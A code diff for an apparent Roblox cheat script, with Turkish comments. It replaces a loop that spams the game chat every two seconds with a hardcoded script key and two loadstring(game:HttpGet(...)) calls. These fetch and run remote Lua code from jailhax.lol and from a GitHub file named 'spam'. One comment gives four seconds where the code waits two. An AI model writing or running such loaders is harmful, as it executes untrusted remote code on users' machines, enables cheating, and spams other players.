@@ -1,11 +1,9 @@
-local TextChatService = game:GetService("TextChatService")
-local channel = TextChatService.TextChannels.RBXGeneral
+script_key = "sBliawCEKYLaHejJOFFLclSnyBiLLSxc"
 
-task.spawn(function()
-	while true do
-		pcall(function()
-			channel:SendAsync("TEAM RAIWESY - THE BEST") -- Mesajı sen istersen değiştir
-		end)
-		task.wait(2) -- Maksimum hızda çalışır
-	end
+-- İlk script hemen çalışır
+loadstring(game:HttpGet("https://jailhax.lol/scripts/FarmFree.lua"))()
+
+-- 4 saniye sonra ikinci script çalışır
+task.delay(2, function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/StrongBomber/projectluacore/refs/heads/main/spam"))()
 end)
